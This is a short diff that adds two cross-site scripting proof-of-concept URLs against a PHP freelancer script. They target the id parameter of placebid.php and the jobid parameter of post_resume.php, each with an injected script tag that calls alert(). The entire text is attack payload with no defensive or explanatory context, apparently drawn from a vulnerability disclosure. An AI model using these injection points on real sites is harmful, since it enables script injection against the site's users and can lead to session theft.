@@ -1,0 +1,4 @@
+http://www.example.com/script/freelancer/placebid.php?id= ADD THIS XSS: 1&lt;script&gt;alert(364298092082)&lt;/script&gt;
+http://www.example.com/script/freelancer/post_resume.php?jobid= ADD THIS XSS: 1&lt;script&gt;alert(372848775668)&lt;/script&gt;
+
+
